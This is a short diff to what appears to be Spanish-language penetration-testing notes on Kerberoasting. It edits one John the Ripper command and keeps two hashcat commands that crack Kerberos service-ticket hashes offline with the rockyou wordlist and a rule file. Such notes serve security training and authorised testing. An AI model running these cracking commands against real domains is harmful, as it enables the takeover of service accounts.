@@ -42,7 +42,7 @@ Paso 2:
 ```bash 
 Paso 3:
 # Crackear el hash 
-❯ john --format=krb5tgs kerberoasting.tgt -w=/usr/share/wordlists/rockyou.txt 
+❯ john --format=krb5tgs kerb.txt -w=/usr/share/wordlists/rockyou.txt 
 ❯ hashcat -m 13100 kerberoasting.tgt /usr/share/wordlists/rockyou.txt --force
 ❯ hashcat -m 13100 --force -a 0 --rules /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule kerberoasting.tgt /usr/share/wordlists/rockyou.txt   
 
